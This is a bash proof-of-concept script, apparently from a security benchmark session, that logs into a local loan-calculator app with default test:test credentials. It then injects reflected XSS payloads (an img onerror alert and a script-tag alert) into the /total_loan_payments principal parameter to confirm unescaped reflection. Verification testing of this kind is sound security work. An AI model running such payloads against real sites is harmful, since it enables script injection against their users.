#!/bin/bash
# POC: Demonstrates reflected XSS vulnerability in /total_loan_payments endpoint by authenticating first, then injecting unescaped HTML/JavaScript in the principal parameter
# Target: ./repo
# Created: 2025-12-01T16:23:11.593Z
# Session: benchmark-XBEN-104-24-minci3mm

# Reflected XSS POC for /total_loan_payments endpoint
# This script demonstrates that user input in the principal parameter
# is reflected unescaped in an HTML response, allowing XSS attacks

TARGET_URL="${1:-http://localhost:8080}"
ENDPOINT="/total_loan_payments"

echo "=== Reflected XSS POC for $TARGET_URL$ENDPOINT ==="
echo ""

# Create a temporary cookie jar for session management
COOKIE_JAR=$(mktemp)
trap "rm -f $COOKIE_JAR" EXIT

# Step 1: Login with default credentials (test:test)
echo "[*] Authenticating with default credentials (test:test)..."
LOGIN_RESPONSE=$(curl -s -c "$COOKIE_JAR" -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test")

# Check if login was successful by looking for redirect or session cookie
if grep -q "session" "$COOKIE_JAR" 2>/dev/null; then
    echo "[+] Authentication successful - session cookie obtained"
else
    echo "[-] Authentication may have failed"
fi

echo ""

# Step 2: Test with normal parameters to verify endpoint access
echo "[*] Testing endpoint access with normal parameters..."
NORMAL_RESPONSE=$(curl -s -b "$COOKIE_JAR" "$TARGET_URL$ENDPOINT?principal=1000&payment=10&term=12")
echo "Normal response: $NORMAL_RESPONSE"
echo ""

# Step 3: Test 1 - Basic XSS payload with img tag and onerror handler
echo "[*] Test 1: Injecting <img src=x onerror=alert(1)> in principal parameter..."
XSS_PAYLOAD='<img src=x onerror=alert(1)>'
XSS_PAYLOAD_ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$XSS_PAYLOAD'''))")

XSS_RESPONSE=$(curl -s -b "$COOKIE_JAR" "$TARGET_URL$ENDPOINT?principal=$XSS_PAYLOAD_ENCODED&payment=10&term=12")
echo "Response with XSS payload: $XSS_RESPONSE"
echo ""

# Check if the payload is reflected unescaped
if echo "$XSS_RESPONSE" | grep -q "<img src=x onerror=alert(1)>"; then
    echo "[+] SUCCESS: XSS payload reflected unescaped in response!"
    echo "[+] The img tag with onerror handler is present in the HTML response"
    echo "[+] This payload would execute if accessed via a browser"
    EXIT_CODE=0
else
    echo "[-] XSS payload was not reflected as-is in response"
    EXIT_CODE=1
fi

# Step 4: Test 2 - Alternative payload with script tag (for additional verification)
echo ""
echo "[*] Test 2: Injecting <script>alert('xss')</script> in principal parameter..."
XSS_PAYLOAD2='<script>alert("xss")</script>'
XSS_PAYLOAD2_ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$XSS_PAYLOAD2'''))")

XSS_RESPONSE2=$(curl -s -b "$COOKIE_JAR" "$TARGET_URL$ENDPOINT?principal=$XSS_PAYLOAD2_ENCODED&payment=10&term=12")
echo "Response with script payload: $XSS_RESPONSE2"
echo ""

if echo "$XSS_RESPONSE2" | grep -q "<script>alert"; then
    echo "[+] SUCCESS: Script tag payload reflected unescaped in response!"
    EXIT_CODE=0
fi

# Step 5: Verify Content-Type allows script execution in browser
echo ""
echo "[*] Verifying response Content-Type..."
HEADERS=$(curl -s -b "$COOKIE_JAR" -i "$TARGET_URL$ENDPOINT?principal=$XSS_PAYLOAD_ENCODED&payment=10&term=12" | head -20)
echo "$HEADERS" | head -10
echo ""

if echo "$HEADERS" | grep -i "content-type" | grep -q "text/html"; then
    echo "[+] Response is served as text/html, meaning scripts would execute in browser"
fi

exit $EXIT_CODE